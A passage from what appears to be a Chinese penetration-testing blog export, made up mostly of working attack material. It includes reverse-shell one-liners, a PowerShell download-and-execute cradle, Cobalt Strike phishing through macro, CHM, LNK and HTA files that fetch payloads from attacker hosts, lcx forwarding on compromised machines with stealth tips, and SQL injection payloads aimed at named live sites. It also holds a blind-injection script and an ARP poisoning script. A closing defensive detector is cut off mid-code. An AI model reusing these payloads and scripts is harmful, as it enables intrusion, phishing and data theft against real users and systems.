net.webclient;$f.proxy=[Net.WebRequest]::GetSystemWebProxy();$f.Proxy.Credentials=[Net.CredentialCache]::DefaultCredentials;IEX $f.downloadstring (&apos;http://192.168.209.159:8080/1nLv5Znszan1&apos;); Cobalt strike反弹shell博客中有一个专门的文章对Cobalt strike做介绍。 bash版本：bash -i &gt;&amp; /dev/tcp/10.0.0.1/8080 0&gt;&amp;1 注意某些linux不支持 这里shell由bash解析，有时候是由sh解析，不一定百发百中 这里&amp;在Linux shell中表示后台运行，当然这里0&gt;&amp;1不是这样,对于&amp;1更准确的说应该是文件描述符1,而1一般代表的就是STDOUT_FILENO perl版本:perl -e &apos;use Socket;$i=&quot;10.0.0.1&quot;;$p=1234;socket(S,PF_INET,SOCK_STREAM,getprotobyname(&quot;tcp&quot;));if(connect(S,sockaddr_in($p,inet_aton($i)))){open(STDIN,&quot;&gt;&amp;S&quot;);open(STDOUT,&quot;&gt;&amp;S&quot;);open(STDERR,&quot;&gt;&amp;S&quot;);exec(&quot;/bin/sh -i&quot;);};&apos; python版本：python -c &apos;import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect((&quot;10.0.0.1&quot;,1234));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call([&quot;/bin/sh&quot;,&quot;-i&quot;]);&apos; php版本：php -r &apos;$sock=fsockopen(&quot;10.0.0.1&quot;,1234);exec(&quot;/bin/sh -i &lt;&amp;3 &gt;&amp;3 2&gt;&amp;3&quot;);&apos; ruby版本：ruby -rsocket -e&apos;f=TCPSocket.open(&quot;10.0.0.1&quot;,1234).to_i;exec sprintf(&quot;/bin/sh -i &lt;&amp;%d &gt;&amp;%d 2&gt;&amp;%d&quot;,f,f,f)&apos; nc版本：nc -e /bin/sh 10.0.0.1 1234 rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2&gt;&amp;1 nc 10.0.0.1 1234 &gt;/tmp/f nc x.x.x.x 8888|/bin/sh|nc x.x.x.x 9999 java版本r = Runtime.getRuntime() p = r.exec([&quot;/bin/bash&quot;,&quot;-c&quot;,&quot;exec 5&lt;&gt;/dev/tcp/10.0.0.1/2002;cat &lt;&amp;5 | while read line; do \$line 2&gt;&amp;5 &gt;&amp;5; done&quot;] as String[]) p.waitFor()]]></content>
      <categories>
        <category>shell</category>
      </categories>
  </entry>
  <entry>
    <title><![CDATA[lcx使用:端口转发]]></title>
    <url>%2F2018%2F12%2F03%2Flcx%E4%BD%BF%E7%94%A8-%E7%AB%AF%E5%8F%A3%E8%BD%AC%E5%8F%91%2F</url>
    <content type="text"><![CDATA[端口映射在入侵内网的时候经常用到，特别是要登陆远程终端服务时，使用端口映射就非常方便。 Lcx.exe是一个端口转发工具，相当于把肉鸡A上的3389端口转发到具有外网IP地址的B机上,这样连接B机的3389就相当于连接A机的3389端口。Lcx程序多用于被控制计算机(肉鸡)处于内网的情况，被控制机可能中了木马程序，虽然能够进行控制，但还是没有使用远程终端登陆到本机进行管理方便，因此在很多情况下，都会想方设法在被控制计算机上开启3389端口，然后通过lcx等程序进行端口转发，进而在本地连接到被控制计算机的远程终端并进行管理和使用。 三个功能tran功能ran功能是端口转向功能，通过访问该端口可以直接与该主机或另一台的某一个端口进行通信。 例如： 本机端口转向：lcx -tran 55 127.0.0.1 3389 转向其他主机端口：肉机运行： lcx.exe -slave 10.60.17.46 55 192.168.209.160 3389 操作机运行： lcx.exe -listen 55 3389 【原来的图片丢了….只能借用一下别人的了】 在被控制计算机上使用netstat -an查看当前所有的连接时，可以看到被控制计算机时在跟自己进行远程终端连接，而实际的3389端口是跟本机的55端口进行连接的。 注意： 如果被控制计算机是服务器，则在登陆时可以直接进行登陆;如果被控制计算机是Windows XP系统，则最好选择用户不在计算机的时间进行登陆，否则容易被发现。 不要轻易在被控制计算机上建立账号，尤其是Windows XP，建立帐号后，会立即在登陆界面中进行显示。]]></content>
      <categories>
        <category>内网渗透工具</category>
      </categories>
  </entry>
  <entry>
    <title><![CDATA[Cobalt Strike的使用]]></title>
    <url>%2F2018%2F12%2F03%2FCobalt-Strike%E7%9A%84%E4%BD%BF%E7%94%A8%2F</url>
    <content type="text"><![CDATA[Cobalt Strike简介： Cobalt Strike是一款渗透测试软件，分为客户端与服务端，服务端是一个，客户端可以有多个，可以进行团队分布式操作 Cobalt Strike集成了端口转发、扫描多模式端口Listener、Windows exe程序生成、Windows dll动态链接库生成、java程序生成、office宏代码生成，包括站点克隆获取浏览器的相关信息等。 Cobalt Strike的安装Ubuntu 默认只有openjdk的源，但是cobalt strike建议使用oracle jdk需要需要先加入源。 apt-get install software-properties-common python-software-propertie add-apt-repository ppa:webupd8team/java apt-get update apt-get install oracle-Java8-installer 下载好Cobalt Strike工具然后解压缩。 进入Cobalt Strike文件内部开启服务 sudo ./teamserver 10.60.17.46 123456 后面这两个数是服务器IP（ubuntu的IP）和密码 配置客户端客户端需要安装java环境，平台并无特殊要求。 启动： Ubuntu:java-jar cobalt strike windows直接双击启动 host：服务器主机 port：50050 user：自定 password：服务器设置的 进入后首先配置监听器：点击上方Cobalt Strike选项——&gt;在下拉框中选择listeners——&gt;在下方弹出区域中单机add name：为监听器名字。 选择payload类型 host为shell反弹接受主机（服务端IP） port为反弹端口 其实,监听器的作用很简单,主要是为了接受payload回传的各类数据 比如,我们的payload在目标机器执行以后,会回连到监听器然后下载执行真正的shellcode代码,其实跟msf中handler的作用基本是一致的 beacon 为cs内置监听器,也就是说,当我们在目标系统成功执行payload以后,会弹回一个beacon的shell给cs 该shell所支持的通信协议主要包括这几种,dns,https,http,smb[pipe],另外,beacon shell的内置功能也非常多 foreign 主要是提供给外部使用的一些监听器,比如你想利用cs派生一个meterpreter的shell回来,来继续后面的内网渗透,这时就选择使用外部监听器 生成payload：点击attacks——&gt;packages——&gt;windows executable listener为监听器名字 output为输出靶机类型。 点击generate弹出的对话框中选择保存位置和输入payload名字。 在windows靶机中双击payload生成文件（artifact.exe） 得到反弹shell 主机上线以后需要将默认刷新时间改成0，cobalt strike为了维持连接，会每60秒发送一次连接，但是如果使用的话60秒会造成卡顿。 修改方法：右键弹出的内容下拉菜单中选择session-&gt;sleep，弹出的对话框中输入0，单击确定 右键弹出的内容下拉菜单中选择Interact，上线主机。 office钓鱼office钓鱼在无需交互、用户无感知的情况下，执行Office文档中内嵌的一段恶意代码，从远控地址中下载并运行恶意可执行程序，例如远控木马或者勒索病毒等。 Cobalt Strike office钓鱼主要方法是生成一段vba代码，然后将代码复制到office套件中，当用户启动office自动运行 具体操作：点击Cobalt Strike主界面中attacks-&gt;packages-&gt;ms office macro 弹出界面选择Listener，单机确定 对话框中给出每一步仔细操作，单机copy macro按钮 word操作 点击上方标签视图标签 在该标签中点击宏按钮，弹出的对话框中输入宏名字，然后单机创建按钮 首先清空所有代码，然后将生成的代码复制到编辑器中，关闭宏编辑窗口 保存退出 双击再次运行保存的文档 当目标机器运行文档以后，Cobalt Strike会接受到目标机器反弹的shell 目标则会增加一个rundll32.exe的进程 CVE-2017-11882漏洞简介 漏洞为0ffice内存破坏漏洞，影响目前流行的所有0ffice版本。攻击者可以利用漏洞以当前登录的用户的身份执行任意命令。 该漏洞出现在模块EQNEDT32.EXE中，属于栈溢出漏洞，是对Equation Native 数据结构处理不当导致。 漏洞影响： Microsoft Office 2007 Microsoft Office 2010 Microsoft Office 2013 Microsoft Office 2016 复现：下载https://github.com/Ridter/CVE-2017-11882python攻击脚本。 虽然是栈溢出漏洞，但是该漏洞对于命令有限制，分为可以执行43b和执行109b，所以在利用过程需要注意命令长度。 python Command109b_CVE-2017-11882.py -c &quot;cmd.exe /c calc.exe&quot; CHM钓鱼CHM介绍 CHM（Compiled Help Manual）即“已编译的帮助文件”。它是微软新一代的帮助文件格式，利用HTML作源文，把帮助内容以类似数据库的形式编译储存。 利用CHM钓鱼主要原因是因为该文档可以执行cmd命令 这里制作CHM需要用到一个工具就是 EasyCHM CHM制作过程：创建一个文件夹（名字随意），在文件夹里面再创建两个文件夹（名字随意）和一个index.html文件，在两个文件夹内部创建各创建一个index.html文件。 先将下列代码复制到根文件夹中的index.html中。 &lt;!DOCTYPE html&gt;&lt;html&gt;&lt;head&gt;&lt;title&gt;Mousejack replay&lt;/title&gt;&lt;head&gt;&lt;/head&gt;&lt;body&gt; command exec &lt;OBJECT id=x classid=&quot;clsid:adb880a6-d8ff-11cf-9377-00aa003b7a11&quot; width=1 height=1&gt; &lt;PARAM name=&quot;Command&quot; value=&quot;ShortCut&quot;&gt; &lt;PARAM name=&quot;Button&quot; value=&quot;Bitmap::shortcut&quot;&gt; &lt;PARAM name=&quot;Item1&quot; value=&apos;,calc.exe&apos;&gt; &lt;PARAM name=&quot;Item2&quot; value=&quot;273,1,1&quot;&gt; &lt;/OBJECT&gt; &lt;SCRIPT&gt; x.Click(); &lt;/SCRIPT&gt; &lt;/body&gt;&lt;/html&gt; 打开我们的EasyCHM工具 后点击新建 然后导入自己创建的文件夹，点击确定后再点击编译，在弹出的对话框中点击生成CHM按钮 它会给你生产一个CHM文件，给别人发过去，一旦点击就会给弹出计算机 生成钓鱼文件启动Cobalt Strike，点击attacks——&gt;web Drive by——&gt;scripted web Delivery在弹出的对话框中将type类型设置为powershell然后单击launch按钮 再用代码将上面创建的根文件夹中的index.html代码中的calc.exe替换掉。 &lt;!DOCTYPE html&gt;&lt;html&gt;&lt;head&gt;&lt;title&gt;Mousejack replay&lt;/title&gt;&lt;head&gt;&lt;/head&gt;&lt;body&gt; command exec &lt;OBJECT id=x classid=&quot;clsid:adb880a6-d8ff-11cf-9377-00aa003b7a11&quot; width=1 height=1&gt; &lt;PARAM name=&quot;Command&quot; value=&quot;ShortCut&quot;&gt; &lt;PARAM name=&quot;Button&quot; value=&quot;Bitmap::shortcut&quot;&gt; &lt;PARAM name=&quot;Item1&quot; value=&quot;,powershell.exe, -nop -w hidden -c IEX ((new-object net.webclient).downloadstring(&apos;http://192.168.209.151:81/aa&apos;))&quot;&gt; &lt;PARAM name=&quot;Item2&quot; value=&quot;273,1,1&quot;&gt; &lt;/OBJECT&gt; &lt;SCRIPT&gt; x.Click(); &lt;/SCRIPT&gt; &lt;/body&gt;&lt;/html&gt; 生产CHM发送给别人，点击后获得反弹的shell LNK钓鱼 lnk文件是用于指向其他文件的一种文件。这些文件通常称为快捷方式文件，通常它以快捷方式放在硬盘上，以方便使用者快速的调用。 lnk钓鱼主要将图标伪装成正常图标，但是目标会执行shell命令。 先做个简单的powershell生产图标：创建个txt文本写入下面代码然后改文件后缀名为.ps1。 cmd /c calc.exe 右键文件powershell运行后会弹出计算器 钓鱼方法：首先通过Cobalt Strike的attacks——&gt;web Drive by——&gt;scripted web Delivery tpye类型为powershell，然后单机launch。生产代码。 还记的上面做的那个简单的powershell么，后缀改回txt，将生成的代码替换掉calc.exe 将下面的powershell代码写入.ps1文件，右键运行powershell。 $file = Get-Content &quot;test.txt&quot; $WshShell = New-Object -comObject WScript.Shell $Shortcut = $WshShell.CreateShortcut(&quot;test.lnk&quot;) $Shortcut.TargetPath = &quot;%SystemRoot%\system32\cmd.exe&quot; $Shortcut.IconLocation = &quot;%SystemRoot%\System32\Shell32.dll,21&quot; $Shortcut.Arguments = &apos; &apos;+ $file $Shortcut.Save() 生成test.lnk文件，而且图标改了（powershell执行文件要和test.txt要在一个目录下，这个图标所在位置就在%SystemRoot%\System32\Shell32.dll目录下） 后将test.lnk发送给他人，获得反弹shell。 HTA钓鱼 HTA是HTML Application的缩写，直接将HTML保存成HTA的格式，是一个独立的应用软件。 HTA虽然用HTML、JS和CSS编写，却比普通网页权限大得多，它具有桌面程序的所有权限。 就是一个html应用程序，双击就能运行。 复现：Cobalt Strike，attacks——&gt;packages——&gt;HTML application 选择powershell然后单机generate，选择保存路径。 将生成的.hta文件发送给别人，点击后获得shell 网站克隆 Cobalt Strike还能够实现网站克隆 cotalt strike能够快速复制目标网站前端页面，并且复制相识度极高 cotalt strike同时还可以在复制的网站中插入恶意代码，如果本地浏览器带有漏洞的用户，可以直接控制目标机器。 点击attacks——&gt;Web Drive-by——&gt;Clone site Clone URL：克隆目标网站的URL（如果网站不是80端口的话域名后得跟上端口号。） 注意问题：URL需要添加http协议和端口（80） Local URL：本地克隆路径 Local Host：本地主机IP Local Port：本地端口 Attack：克隆后目标网站执行脚本，如：flash漏洞 后渗透阶段相信你已经能拿到一个beacon的shell了。 下面是一些基本的使用命令，但是cs监听器对中文支持并不友好，会对中文产生乱码。 help 查看beacon shell所有内置命令帮助,如果想查看指定命令的用法,可以这样,eg: help checkin note 给当前目录机器起个名字, eg: note beacon-shell cd 在目标系统中切换目录,注意在win系统中切换目录要用双反斜杠,或者直接用&apos;/&apos; eg: cd c:\\ mkdir 新建目录, eg: mkdir d:\\beacon rm 删除文件或目录, eg: rm d:\\beacon upload 上传文件到目标系统中 download 从目标系统下载指定文件,eg: download C:\\Users\\win7cn\\Desktop\\putty.exe cancel 取消下载任务,比如,一个文件如果特别大,下载可能会非常耗时,假如中途你不想继续下了,就可以用这个取消一下 shell 在目标系统中执行指定的cmd命令, eg: shell whoami getuid 查看当前beacon 会话在目标系统中的用户权限,可能需要bypassuac或者提权 pwd 查看当前在目录系统中的路径 ls 列出当前目录下的所有文件和目录 drives 列表出目标系统的所有分区[win中叫盘符] ps 查看目标系统当前的所有的进程列表 kill 杀掉指定进程, eg: kill 4653 sleep 10 指定被控端休眠时间,默认60秒一次回传,让被控端每10秒来下载一次任务,实际中频率不宜过快,容易被发现,80左右一次即可 jobs 列出所有的任务列表,有些任务执行时间可能稍微较长,此时就可以从任务列表中看到其所对应的具体任务id,针对性的清除 jobkill 如果发现任务不知是何原因长时间没有执行或者异常,可尝试用此命令直接结束该任务, eg: jobkill 1345 clear 清除beacon内部的任务队列 checkin 强制让被控端回连一次 exit 终止当前beacon 会话 ctrl + k 清屏 有些可能会触发敏感api导致防护报警,另外进程注入,被控端可能感到非常明显的卡顿,工具也有许多不完善的地方]]></content>
      <categories>
        <category>渗透工具</category>
      </categories>
  </entry>
  <entry>
    <title><![CDATA[MySQL报错注入方法整理]]></title>
    <url>%2F2018%2F12%2F03%2FMySQL%E6%8A%A5%E9%94%99%E6%B3%A8%E5%85%A5%E6%96%B9%E6%B3%95%E6%95%B4%E7%90%86%2F</url>
    <content type="text"><![CDATA[mysql暴错注入方法整理：通过floor，UpdateXml，ExtractValue，NAME_CONST，Error based Double Query Injection等方法。 报错注入：（and后不能直接跟select，可以加（）） 1.报错注入floor—-&gt;(select 1 from (select count(*),concat((payload[]),floor(rand()*2))a from information_schema.columns group by a)b)limit 0,1 2.报错注入extractvalue—-&gt;select extractvalue(1,concat(0x5c,([payload]))) 3.报错注入updatexml—-&gt;select 1=(updatexml(1,concat(0x3a,([payload])),1)) 4.报错注入Exp—-&gt;select Exp(~(select * from ([payload])a)) 通过floor暴错(原理在底部)/数据库版本/http://127.0.0.1/2/Less-5/?id=1&apos; and (select 1 from (select count(*),concat((select version()),floor(rand()*2))a from information_schema.columns group by a)b)limit 0,1 --+ /简单办法暴库/http://www.waitalone.cn/sql.php?id=info() /连接用户/http://www.waitalone.cn/sql.php?id=1+and(select 1 from(select count(),concat((select (select (select concat(0x7e,user(),0x7e))) from information_schema.tables limit 0,1),floor(rand(0)2))x from information_schema.tables group by x)a) /连接数据库/http://127.0.0.1/2/Less-5/?id=1&apos; and (select 1 from (select count(*),concat((select database()),floor(rand()*2))a from information_schema.columns group by a)b)limit 0,1 --+ /暴库/http://www.waitalone.cn/sql.php?id=1+and(select 1 from(select count(),concat((select (select (SELECT distinct concat(0x7e,schema_name,0x7e) FROM information_schema.schemata LIMIT 0,1)) from information_schema.tables limit 0,1),floor(rand(0)2))x from information_schema.tables group by x)a) /暴表/http://www.waitalone.cn/sql.php?id=1+and(select 1 from(select count(),concat((select (select (SELECT distinct concat(0x7e,table_name,0x7e) FROM information_schema.tables where table_schema=database() LIMIT 0,1)) from information_schema.tables limit 0,1),floor(rand(0)2))x from information_schema.tables group by x)a) /暴字段/http://www.waitalone.cn/sql.php?id=1+and(select 1 from(select count(),concat((select (select (SELECT distinct concat(0x7e,column_name,0x7e) FROM information_schema.columns where table_name=0x61646D696E LIMIT 0,1)) from information_schema.tables limit 0,1),floor(rand(0)2))x from information_schema.tables group by x)a) /暴内容/http://www.waitalone.cn/sql.php?id=1+and(select 1 from(select count(),concat((select (select (SELECT distinct concat(0x23,username,0x3a,password,0x23) FROM admin limit 0,1)) from information_schema.tables limit 0,1),floor(rand(0)2))x from information_schema.tables group by x)a) ExtractValue(有长度限制,最长32位)http://www.waitalone.cn/sql.php?id=1+and extractvalue(1, concat(0x7e, (select @@version),0x7e)) http://www.waitalone.cn/sql.php?id=1+and extractvalue(1, concat(0x7e,(SELECT distinct concat(0x23,username,0x3a,password,0x23) FROM admin limit 0,1))) UpdateXml(有长度限制,最长32位)http://www.waitalone.cn/sql.php?id=1+and updatexml(1,concat(0x7e,(SELECT @@version),0x7e),1) http://www.waitalone.cn/sql.php?id=1+and updatexml(1,concat(0x7e,(SELECT distinct concat(0x23,username,0x3a,password,0x23) FROM admin limit 0,1),0x7e),1) NAME_CONST(适用于低版本)http://wlkc.zjtie.edu.cn/qcwh/content/detail.php?id=330&amp;sid=19&amp;cid=261+and+1=(select+*+from+(select+NAME_CONST(version(),1),NAME_CONST(version(),1))+as+x)-- Error based Double Query Injection(http://www.vaibs.in/error-based-double-query-injection/) /数据库版本/http://www.waitalone.cn/sql.php?id=1+or+1+group+by+concat_ws(0x7e,version(),floor(rand(0)*2))+having+min(0)+or+1 floor报错详解floor----&gt;(select 1 from (select count(*),concat((payload[]),floor(rand()*2))a from information_schema.columns group by a)b)limit 0,1 Rand() //随机函数 Floor() //取整函数 Count() //聚合函数 Group by key //分组语句 当在一个聚合函数，比如count函数后面如果使用分组语句就会把查询的一部分以错误的形式显示出来。[这个是Mysql的bug]。 0x3a ：的十六进制，在这里把他作为分隔符，没有它查出来的东西就连成一片。 group by key的原理是循环读取数据的每一行，将结果保存于临时表中。读取每一行的key时，如果key存在于临时表中，则不在临时表中更新临时表中的数据；如果该key不存在于临时表中，则在临时表中插入key所在行的数据。group by floor(random(0)*2)出错的原因是key是个随机数，检测临时表中key是否存在时计算了一下floor(random(0)*2)可能为0，如果此时临时表只有key为1的行不存在key为0的行，那么数据库要将该条记录插入临时表，由于是随机数，插时又要计算一下随机值，此时floor(random(0)*2)结果可能为1，就会导致插入时冲突而报错。即检测时和插入时两次计算了随机数的值不一致，导致插入时与原本已存在的产生冲突的错误。]]></content>
      <categories>
        <category>SQL</category>
      </categories>
  </entry>
  <entry>
    <title><![CDATA[PHP绕过md5]]></title>
    <url>%2F2018%2F12%2F03%2FPHP%E7%BB%95%E8%BF%87md5%2F</url>
    <content type="text"><![CDATA[测试代码： if (isset($_GET[&apos;Username&apos;]) &amp;&amp; isset($_GET[&apos;password&apos;])) { $logined = true; $Username = $_GET[&apos;Username&apos;]; $password = $_GET[&apos;password&apos;]; if (!ctype_alpha($Username)) {$logined = false;} if (!is_numeric($password) ) {$logined = false;} if (md5($Username) != md5($password)) {$logined = false;} if ($logined){ echo &quot;successful&quot;; } else { echo &quot;login failed!&quot;; } } 在做用户登录的时候常常会用到md5加密计算比较密码，md5后相等，就可以成功执行下一步语句，登录成功。但是这样做并不安全，因为 0e在比较的时候会将其视作为科学计数法，所以无论0e后面是什么，0的多少次方还是0。 md5开头是0e的字符串:QNKCDZO： 0e830400451993494058024219903391 s878926199a： 0e545993274517709034328855841020 s155964671a： 0e342768416822451524974117254469 s214587387a： 0e848240448830537924465865611904 s214587387a： 0e848240448830537924465865611904 s878926199a： 0e545993274517709034328855841020 s1091221200a： 0e940624217856561557816327384675 解决方案使用全等 ===]]></content>
      <categories>
        <category>加密解密</category>
      </categories>
  </entry>
  <entry>
    <title><![CDATA[比二分法更OK的盲注多线程]]></title>
    <url>%2F2018%2F12%2F03%2F%E6%AF%94%E4%BA%8C%E5%88%86%E6%B3%95%E6%9B%B4OK%E7%9A%84%E7%9B%B2%E6%B3%A8%E5%A4%9A%E7%BA%BF%E7%A8%8B%2F</url>
    <content type="text"><![CDATA[废话不多说，直接上脚本： import threading import requests user_agent = [ &quot;Mozilla/5.0 (Windows NT 6.0) AppleWebKit/536.5 (KHTML, like Gecko) Chrome/19.0.1084.36 Safari/536.5&quot;, &quot;Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/536.3 (KHTML, like Gecko) Chrome/19.0.1063.0 Safari/536.3&quot;, &quot;Mozilla/5.0 (Windows NT 5.1) AppleWebKit/536.3 (KHTML, like Gecko) Chrome/19.0.1063.0 Safari/536.3&quot;, &quot;Mozilla/5.0 (Macintosh; Intel Mac OS X 10_8_0) AppleWebKit/536.3 (KHTML, like Gecko) Chrome/19.0.1063.0 Safari/536.3&quot;, &quot;Mozilla/5.0 (Windows NT 6.2) AppleWebKit/536.3 (KHTML, like Gecko) Chrome/19.0.1062.0 Safari/536.3&quot;, &quot;Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/536.3 (KHTML, like Gecko) Chrome/19.0.1062.0 Safari/536.3&quot;, &quot;Mozilla/5.0 (Windows NT 6.2) AppleWebKit/536.3 (KHTML, like Gecko) Chrome/19.0.1061.1 Safari/536.3&quot;, &quot;Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/536.3 (KHTML, like Gecko) Chrome/19.0.1061.1 Safari/536.3&quot; ] class MyThread(threading.Thread): def __init__(self, func, args): threading.Thread.__init__(self) self.func = func self.args = args def getresult(self): return self.res def run(self): self.res = self.func(*self.args) def asc(a,i,payload): asci = 2**i url = &quot;http://127.0.0.1/2/Less-5/?id=1&apos;and ascii(substr((&quot;+payload+&quot;),&quot;+str(a)+&quot;,1))%26&quot;+str(asci)+&quot;=&quot;+str(asci)+ &quot;--+&quot; header = {&apos;User-Agent&apos;: user_agent[i]} html = requests.get(url, headers=header) if html.text.find(&quot;You are in...........&quot;)!=-1: return asci return 0 def main(): payload = input(&apos;请输入payload(比如select user()/user()/SELECT group_concat(SCHEMA_name) from information_schema.SCHEMATA)：&apos;) a=1 f=True char = &apos;&apos; while f: threads = [] sum = 0 for i in range(0,8): t = MyThread(asc, (a, i, payload)) threads.append(t) for i in range(0,8): threads[i].start() for i in range(0,8): threads[i].join() sum = sum + threads[i].getresult() if sum ==0: f = False char = char +chr(sum) a = a+1 print(char) if __name__ == &apos;__main__&apos;: main()]]></content>
      <categories>
        <category>python脚本</category>
      </categories>
  </entry>
  <entry>
    <title><![CDATA[python实现ARP攻击]]></title>
    <url>%2F2018%2F12%2F03%2Fpython%E5%AE%9E%E7%8E%B0ARP%E6%94%BB%E5%87%BB%2F</url>
    <content type="text"><![CDATA[from scapy.all import * import os import sys import threading import signal interface = &apos;Realtek PCIe GBE Family Controller&apos; target_ip=&apos;10.60.17.12&apos; gateway_ip=&apos;10.60.17.1&apos; packet_count=1000 #设置嗅探的网卡 conf.iface=interface #关闭输出 conf.verb = 0 print(&apos;[*]Setting up&apos;+interface) def restore_target(gateway_ip, gateway_mac, target_ip, target_mac): print(&apos;[*]Restoring target.....&apos;) send(ARP(op=2,psrc=gateway_ip,pdst=target_ip,hwdst=&apos;ff:ff:ff:ff:ff:ff&apos;,hwsrc=gateway_mac),count=5) send(ARP(op=2, psrc=target_ip, pdst=gateway_ip,hwdst=&apos;ff:ff:ff:ff:ff:ff&apos;,hwsrc=target_mac),count=5) #发送退出信号到主线程 os.kill(os.getpid(),signal.SIGINT) def get_mac(ip_address): responses,unanswered = srp(Ether(dst=&apos;ff:ff:ff:ff:ff:ff&apos;)/ARP(pdst=ip_address),timeout=2,retry=10) for s, r in responses: return r[Ether].src return None def poison_target(gateway_ip, gateway_mac, target_ip, target_mac): poison_target = ARP() poison_target.op = 2 poison_target.psrc = gateway_ip poison_target.pdst = target_ip poison_target.hwdst = target_mac poison_gateway = ARP() poison_gateway.op = 2 poison_gateway.psrc = target_ip poison_gateway.pdst = gateway_ip poison_gateway.hwdst = gateway_mac print(&quot;[*] Beginning the ARP poison.[ CTRL-C to stop]&quot;) while True: try: send(poison_target) send(poison_gateway) time.sleep(2) except KeyboardInterrupt: restore_target(gateway_ip, gateway_mac, target_ip, target_mac) print(&quot;[*] ARP poison attack finished.&quot;) return gateway_mac = get_mac(gateway_ip) if gateway_mac is None: print(&quot;[!!!]Faile to get gateway MAC. Exiting&quot;) sys.exit(0) else: print(&apos;[*] Gateway %s is at %s&apos;%(gateway_ip,gateway_mac)) target_mac = get_mac(target_ip) if target_mac is None: print(&apos;[!!!]Faile to get target MAC. Exiting&apos;) sys.exit(0) else: print(&apos;[*] Target %s is at %s&apos; % (target_ip, target_mac)) #开启ARP攻击线程 poison_thread = threading.Thread(target=poison_target,args=(gateway_ip,gateway_mac,target_ip,target_mac)) poison_thread.start() try: print(&apos;[*]Starting sniffer for %d packets&apos;%packet_count) bpf_filter = &apos;ip host %s&apos;%target_ip packes = sniff(count=packet_count,filter=bpf_filter,iface=interface) #将捕获到的数据包传输到文件 wrpcap(&apos;arper.pcap&apos;,packes) #还原网络配置 restore_target(gateway_ip,gateway_mac,target_ip,target_mac) except KeyboardInterrupt: restore_target(gateway_ip, gateway_mac, target_ip, target_mac) sys.exit(0) 好了，现在可以断别人网了….]]></content>
      <categories>
        <category>python脚本</category>
      </categories>
  </entry>
  <entry>
    <title><![CDATA[基于流量分析的SQL注入检测]]></title>
    <url>%2F2018%2F12%2F03%2F%E5%9F%BA%E4%BA%8E%E6%B5%81%E9%87%8F%E5%88%86%E6%9E%90%E7%9A%84SQL%E6%B3%A8%E5%85%A5%E6%A3%80%E6%B5%8B%2F</url>
    <content type="text"><![CDATA[from scapy.all import * import re import datetime from pyecharts import Geo import pygeoip import pymysql from selenium import webdriver driver = webdriver.Firefox() driver.get(&quot;file:///D:/python%E9%A1%B9%E7%9B%AE/black%20hat/%E5%9F%BA%E4%BA%8E%E6%B5%81%E9%87%8F%E5%88%86%E6%9E%90%E7%9A%84SQL%E6%B3%A8%E5%85%A5%E6%A3%80%E6%B5%8B/map.html&quot;) gi = pygeoip.GeoIP(&apos;GeoLiteCity.dat&apos;) geo = Geo(&quot;SQL注入威胁感知&quot;, &quot;data from traffic&quot;, title_color=&quot;#fff&quot;, title_pos=&quot;left&quot;, width=1200, height=1000, background_color=&apos;#404a59&apos;) db = pymysql.connect(host=&apos;localhost&apos;, port=3306, user=&apos;root&apos;, passwd=&apos;root&apos;, db=&apos;test&apos;) data = {} def printRecord(ip,sip): rec = gi.record_by_name(ip) city = rec[&apos;city&apos;] country = rec[&apos;country_name&apos;] long = rec[&apos;longitude&apos;] lat = rec[&apos;latitude&apos;] with db.cursor() as cursors: cou = &quot;select ifnull((select 1 from detection where ip=%s limit 1), 0)&quot; cursors.execute(cou,sip) s = cursors.fetchone() if s[0] == 1: sql = &apos;update detection set attacksum = attacksum+1 where ip=%s;&apos; cursors.execute(sql,sip) db.commit() else: sql = &apos;insert into detection(`ip`,`city`,`country`,`lat`,`long`,`attacksum`)values(%s,%s,%s,%s,%s,%s);&apos; cursors.execute(sql,[sip,city,country,lat,long,1]) db.commit() number = &quot;select count(*) from detection;&quot; cursors.execute(number) ss = cursors.fetchone() for l in range(1,ss[0]+1): mysqls = &apos;select attacksum from detection where sequence=%s;&apos; cursors.execute(mysqls, l) attnum = cursors.fetchone() longs = &quot;select `long` from detection where sequence=%s;&quot; cursors.execute(longs, l) longg = cursors.fetchone() lats = &quot;select lat from detection where sequence=%s;&quot; cursors.execute(lats, l) latt = cursors.fetchone() ips = &quot;select ip from detection where sequence=%s;&quot; cursors.execute(ips, l) ipp = cursors.fetchone() geo.add_coordinate(&quot;攻击者&quot;+ str(l),str(longg[0]), str(latt[0])) data[&quot;攻击者&quot;+ str(l)] = [&apos;攻击者IP：&apos; + str(ipp[0]) + &quot;:&quot; + &quot;攻击次数：&quot; + str(attnum[0])] attr, value = geo.cast(data) geo.add(&quot;traffic analyze&quot;, attr, value, type=&quot;effectScatter&quot;, is_random=True, effect_scale=1) geo.render(path=&quot;map.html&quot;) driver.refresh() def test(page): for f in page.payload.payload.payload.fields_desc: fvalue = page.payload.payload.getfieldval(f.name) if &apos;HTTP&apos; in str(fvalue): lst = str(fvalue).split(r&apos;\r\n&apos;) la = re.findall(&apos;(GET )|(POST )&apos;, lst[0]) if la != []: if la[0][0] == &apos;&apos;: with open(&apos;sql.txt&apos;, &apos;r+&apos;) as file: for fi in file.readlines(): for ff in lst: if fi.strip(&apos;\n&apos;) in str(ff.lower()): try: i = datetime.datetime.now() print(&quot;[!]您正在被攻击！&quot;) print(&apos;[*]攻击时间是\t&apos;+str(i)) print(&apos;[*]SQL注入攻击的IP为\t&apos; + page.payload.src) print(&apos;[*]被攻击的地方和payload是\t&apos; + str(ff).strip(&apos;b\&apos;&apos;)) print(&apos;[*]提交的方式为\tPOST&apos;) try: printRecord(page.payload.src, page.payload.src) except: printRecord(&quot;114.242.146.98&quot;, page.payload.src) with open(&apos;danger.log&apos;, &apos;a+&apos;) as f: f.write( &quot;[!]您正在被攻击！\n [*]攻击时间是\t%s\n[*]SQL注入攻击的IP为\t%s\n[*]被攻击的地方和payload是\t%s\n[*]提交的方式为\t POST\n\n&quot; % ( str(i),page.payload.src, str(ff))) except: pass if la[0][1] == &apos;&apos;: with open(&apos;sql.txt&apos;, &apos;r+&apos;) as file: for fi in file.readlines(): for ff in lst: if fi.strip(&apos;\n&apos;) in str(ff.lower()): try: i = datetime.datetime.now() print(&quot;[!]您正在被攻击！&quot;) print(&apos;[*]攻击时间是\t&apos;+str(i)) 